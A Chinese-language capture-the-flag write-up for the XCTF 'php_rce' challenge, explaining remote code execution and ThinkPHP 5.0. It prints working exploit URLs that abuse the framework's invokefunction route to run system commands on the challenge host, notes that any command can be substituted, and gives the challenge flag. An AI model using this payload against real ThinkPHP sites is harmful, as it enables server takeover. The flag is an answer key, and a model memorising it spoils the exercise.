# php_rce

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=fab9bb4e-12e7-4158-b971-f560fad8891a_2)

想要做出来这道题就要先知道什么是rce。rce是Arbitrary code execution的缩写，意为远程代码执行。rce可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。rce分为远程命令执行ping和远程代码执行evel。

- ### RCE
- > rce是Arbitrary code execution的缩写，意为远程代码执行。rce可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。
- > 漏洞产生原因：服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。

知道什么是rce后就能进场景里看看了。

![thinkPHP](https://github.com/C0nstellati0n/NoobCTF/blob/main/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/images/thinkPHP.png)

我之前没有听过thinkPHP，所以在网上搜了一下。

- ### ThinkPHP
- > 为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。

原来是个框架啊。既然题目叫php_rce，那么这道题的目标可能就是利用rce漏洞。我们能直观地看到场景中使用的版本是5.0，在网上随便一搜就能发现这个版本确实有rce漏洞。漏洞成因可以看这篇[文章](https://www.cnblogs.com/backlion/p/10106676.html)了解。

payload在GitHub上也有人整理出来了。这里挑选出对我们有用的payload。

- http://61.147.171.105:62178/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system(%22find%20/%20-name%20%27flag%27%22);%27

其中vars[1][]后面的内容可以替换成任意你想要执行的命令。

- http://61.147.171.105:62178/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag

- ### Flag
- > flag{thinkphp5_rce}